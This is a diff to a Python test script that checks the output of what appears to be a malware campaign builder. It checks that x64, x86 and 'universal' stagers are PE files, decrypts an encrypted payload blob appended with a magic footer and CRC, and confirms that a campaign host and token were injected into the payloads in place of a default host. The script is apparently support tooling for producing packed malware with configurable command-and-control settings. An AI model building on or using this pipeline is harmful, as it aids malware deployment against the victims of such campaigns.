@@ -80,15 +80,19 @@ def main() -> int:
         print("[-] build failed:", exc)
         return 1
 
-    stager = meta["stager"]
-    payload = meta["payload"]
-    stage = meta["stage"]
-    ok("stager exists", os.path.isfile(stager))
-    blob = open(stager, "rb").read()
-    ok("stager is PE", blob[:2] == b"MZ")
-    ok("stager larger than loader",
-       os.path.getsize(stager) > os.path.getsize(campaign_build.LOADER))
+    universal = meta["stager"]
+    stager_x64 = meta["stager_x64"]
+    payload_x64 = meta["payload"]
+    payload_x86 = meta["payload_x86"]
+    stage_x64 = meta["stage_x64"]
+    ok("universal exists", os.path.isfile(universal))
+    ok("universal is PE", open(universal, "rb").read(2) == b"MZ")
+    ok("universal larger than x64 stager",
+       os.path.getsize(universal) > os.path.getsize(stager_x64))
+    ok("x64 stager larger than loader",
+       os.path.getsize(stager_x64) > os.path.getsize(campaign_build.LOADER_X64))
 
+    blob = open(stager_x64, "rb").read()
     plain, crc = decode_blob(blob)
     ok("footer magic", FOOTER.unpack(blob[-FOOTER.size:])[0] == MAGIC)
     ok("blob decrypts", plain is not None)
@@ -96,12 +100,16 @@ def main() -> int:
         ok("crc32 of plaintext", (zlib.crc32(plain) & 0xFFFFFFFF) == crc)
         ok("payload starts with MZ", plain[:2] == b"MZ")
 
-    pblob = open(payload, "rb").read()
-    ok("campaign host injected", host.encode("utf-16-le") in pblob)
-    ok("campaign token injected", token.encode("utf-16-le") in pblob)
-    ok("default host replaced", OLD_HOST.encode("utf-16-le") not in pblob)
-    ok("stage exists", os.path.isfile(stage) and os.path.getsize(stage) > 0)
-    ok("metadata", os.path.isfile(os.path.join(os.path.dirname(stager),
+    for label, path in (("x64", payload_x64), ("x86", payload_x86)):
+        pblob = open(path, "rb").read()
+        ok(f"campaign host injected {label}",
+           host.encode("utf-16-le") in pblob)
+        ok(f"campaign token injected {label}",
+           token.encode("utf-16-le") in pblob)
+        ok(f"default host replaced {label}",
+           OLD_HOST.encode("utf-16-le") not in pblob)
+    ok("stage exists", os.path.isfile(stage_x64) and os.path.getsize(stage_x64) > 0)
+    ok("metadata", os.path.isfile(os.path.join(os.path.dirname(universal),
                                                "campaign.json")))
 
     bad = [n for n, s in CHECKS if not s]
